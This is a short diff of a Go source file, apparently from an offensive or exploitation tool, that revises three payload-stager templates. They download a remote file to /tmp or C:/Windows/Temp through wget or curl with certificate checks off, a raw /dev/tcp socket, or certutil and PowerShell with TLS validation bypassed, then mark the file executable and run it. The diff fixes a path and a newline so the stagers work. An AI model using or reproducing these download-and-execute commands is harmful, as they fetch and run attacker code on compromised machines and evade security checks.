@@ -11,8 +11,8 @@ import (
 )
 
 var (
-	UnixDownloader = "wget --no-check-certificate %s -O /tmp/%s || curl -k %s -o %s && chmod +x /tmp/%s && /tmp/%s"
-	TCPDownloader  = "exec 88<>/dev/tcp/%s && echo -e \".%s\" >&88 && cat <&88 > /tmp/%s && chmod +x /tmp/%s && /tmp/%s"
+	UnixDownloader = "wget --no-check-certificate %s -O /tmp/%s || curl -k %s -o /tmp/%s && chmod +x /tmp/%s && /tmp/%s"
+	TCPDownloader  = "exec 88<>/dev/tcp/%s && echo -e \"%s\\n\" >&88 && cat <&88 > /tmp/%s && chmod +x /tmp/%s && /tmp/%s"
 	WinDownloader  = "certutil -urlcache -split -f %s C:/Windows/Temp/%s || powershell $cli=new-object System.Net.WebClient;[System.Net.ServicePointManager]::ServerCertificateValidationCallback += { $true };$cli.DownloadFile('%s','C:/Windows/Temp/%s') & C:/Windows/Temp/%s"
 )
 
